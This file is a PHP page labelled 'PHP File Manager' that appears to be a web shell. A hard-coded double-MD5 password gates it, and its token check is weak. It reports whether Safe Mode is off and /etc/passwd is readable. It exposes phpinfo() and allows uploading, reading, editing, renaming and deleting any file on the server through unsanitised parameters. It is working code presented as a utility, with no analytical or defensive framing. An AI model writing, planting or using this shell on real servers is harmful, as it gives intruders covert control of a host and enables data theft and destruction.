<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP File Manager</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: #1c1c1c; color: white; }
        .table-hover tbody tr:hover { background-color: #636263; }
        a { text-decoration: none; color: #33f702; }
        a:hover { color: #fff; text-shadow: 0px 0px 10px #ffffff; }
        .rename-box { display: none; }
    </style>
</head>
<body class="container mt-4">
<?php
if (function_exists('opcache_invalidate')) {
    opcache_invalidate(__FILE__, true);
}
error_reporting(E_ALL);

$auth_hash = "ba865573cf5aa6b67f533f9fe02a5a6e";

// Generate a token based on the password hash
function generateToken($password) {
    return md5(md5($password . time())); // Creates a unique hash every login
}

// Check if token is provided in URL
$token_valid = false;
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    //if ($auth_hash . substr($token, 0, 10) === substr($token, 10)) {
    if($auth_hash . substr($token, 0, 10) == substr($token, 10)) {
        $token_valid = true;
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    //session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show password prompt
if (!$token_valid) {
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["password"])) {
        if (md5(md5($_POST["password"])) === $auth_hash) {
            $token = time() . $auth_hash . time();
            //header("Location: " . $_SERVER['PHP_SELF'] . "?token=" . $token);
            echo "<script>window.location.href = '" . $_SERVER['PHP_SELF'] . "?token=" . $token . "';</script>";
            exit;
        } else {
            $error = "Incorrect password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Login</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
        <style>
            body { background-color: #1c1c1c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .auth-box { background: #222; padding: 20px; border-radius: 8px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="auth-box">
            <h4 class="text-white">Enter Password</h4>
            <?php if (isset($error)) echo "<p class='text-danger'>$error</p>"; ?>
            <form method="POST">
                <input type="password" name="password" class="form-control mt-2" placeholder="Password">
                <button class="btn btn-success mt-3" type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>
<h1 class="text-center text-success">PHP File Manager</h1>
<div class="card bg-dark text-white p-3">
    <p><strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?></p>
    <p><strong>Your IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
    <p><strong>Safe Mode:</strong> <span class="text-<?php echo ini_get('safe_mode') ? 'danger' : 'success' ?>">
        <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
    </span></p>
    <p><strong>Read /etc/passwd:</strong> 
        <?php echo is_readable("/etc/passwd") ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>'; ?>
    </p>
    <div class="d-flex gap-2 mt-3">
        <button class="btn btn-success" onclick="window.location.href='?p=info&token=<?php echo $_GET['token'] ?>'">PHP Info</button>
        <button onclick="window.location.href='?logout=true'" class="btn btn-danger">Logout</button>
        <form method="POST" enctype="multipart/form-data" class="d-flex">
            <input type="file" name="file" class="form-control me-2">
            <button type="submit" class="btn btn-success">Upload</button>
        </form>
    </div>
</div>
<?php
if (@$_GET['p'] == "info") {
    phpinfo();
    exit;
}

$path = isset($_GET['y']) ? $_GET['y'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
?>
<div class="card bg-dark text-white p-3 mt-3">
    <h5>Current Path:</h5>
    <div class="d-inline">
        <?php
        $fullPath = "";
        echo '<a href="?y=/" class="text-warning">/</a>'; // Root path
        
        foreach ($paths as $id => $pat) {
            if ($pat === '') continue; // Skip empty segments
            $fullPath .= "/$pat"; // Ensure proper slashes
            echo '<a href="?y=' . $fullPath . '&token=' . $_GET['token'] . '" class="text-warning">' . $pat . '</a>';
            if ($id < count($paths) - 1) {
                echo '<span class="text-white">/</span>'; // Add separator but avoid leading double slashes
            }
        }
        ?>
    </div>
</div>
<?php
if (isset($_FILES['file'])) {
    echo '<div class="alert mt-3 ' . (copy($_FILES['file']['tmp_name'], "$path/" . $_FILES['file']['name']) ? 'alert-success' : 'alert-danger') . '">';
    echo copy($_FILES['file']['tmp_name'], "$path/" . $_FILES['file']['name']) ? "File Upload Successful." : "File Upload Failed.";
    echo '</div>';
}
?>
<table class="table table-dark table-bordered table-hover mt-4">
    <thead class="table-success">
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
    </thead>
    <tbody>
        <?php
        foreach (scandir($path) as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = "$path/$item";
            $isDir = is_dir($itemPath);
            $encodedItem = htmlspecialchars($item);
            ?>
            <tr>
                <td>
                    <a href="<?php echo $isDir ? "?y=$itemPath&token=" . $_GET['token'] : "?filesrc=$itemPath&y=$path&token=" . $_GET['token'] ?>">
                        <?php echo $isDir ? "📁" : "📄" ?> <?php echo $encodedItem ?>
                    </a>
                </td>
                <td><?php echo $isDir ? '--' : round(filesize($itemPath) / 1024, 2) . ' KB' ?></td>
                <td>
                    <?php 
                        $perms = substr(sprintf('%o', fileperms($itemPath)), -4);
                        $writableClass = is_writable($itemPath) ? 'text-success fw-bold' : 'text-danger';
                    ?>
                    <span class="<?php echo $writableClass ?>"><?php echo $perms ?></span>
                </td>
                <td>
                    <!-- Toggle Rename Input -->
                    <button class="btn btn-warning btn-sm toggle-rename" data-id="<?php echo md5($itemPath) ?>">Rename</button>
                    
                    <!-- Rename Form (Initially Hidden) -->
                    <form method="POST" class="rename-box mt-2" id="rename-<?php echo md5($itemPath) ?>" style="display: none;">
                        <input type="hidden" name="path" value="<?php echo $itemPath ?>">
                        <input type="hidden" name="opt" value="rename">
                        <input type="text" name="newname" placeholder="New Name" class="form-control form-control-sm d-inline w-50">
                        <button type="submit" class="btn btn-success btn-sm">Save</button>
                    </form>

                    <!-- Delete Button -->
                    <a href="?delete=<?php echo $itemPath ?>&token=<?php echo $_GET['token'] ?>" class="btn btn-danger btn-sm">Delete</a>
                </td>
            </tr>
            <?php
        }
        ?>
    </tbody>
</table>
<?php
// Handle Rename
if (isset($_POST['opt']) && $_POST['opt'] == 'rename' && isset($_POST['newname'])) {
    $newPath = dirname($_POST['path']) . '/' . $_POST['newname'];
    if (rename($_POST['path'], $newPath)) {
        echo '<div class="alert alert-success mt-3">Rename Successful.</div>';
    } else {
        echo '<div class="alert alert-danger mt-3">Rename Failed.</div>';
    }
}

// Handle Delete
if (isset($_GET['delete'])) {
    $delPath = $_GET['delete'];
    if (is_dir($delPath) ? rmdir($delPath) : unlink($delPath)) {
        echo '<div class="alert alert-success mt-3">Deletion Successful.</div>';
    } else {
        echo '<div class="alert alert-danger mt-3">Deletion Failed.</div>';
    }
}

// Handle File Editing
if (isset($_GET['filesrc'])) {
    echo '<h3 class="mt-4 text-warning">Editing: ' . basename($_GET['filesrc']) . '</h3>';
    echo '<form method="POST"><textarea name="src" class="form-control" rows="10">' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</textarea>';
    echo '<input type="hidden" name="path" value="' . $_GET['filesrc'] . '">';
    echo '<button type="submit" class="btn btn-primary mt-2">Save</button></form>';
}

if (isset($_POST['path']) && isset($_POST['src'])) {
    file_put_contents($_POST['path'], $_POST['src']);
    echo '<div class="alert alert-success mt-3">File Saved.</div>';
}
?>
<script>
document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll('.toggle-rename').forEach(button => {
        button.addEventListener("click", function () {
            let formId = "rename-" + this.getAttribute("data-id");
            let form = document.getElementById(formId);
            form.style.display = (form.style.display === "none" || form.style.display === "") ? "block" : "none";
        });
    });
});
</script>
</body>
</html>
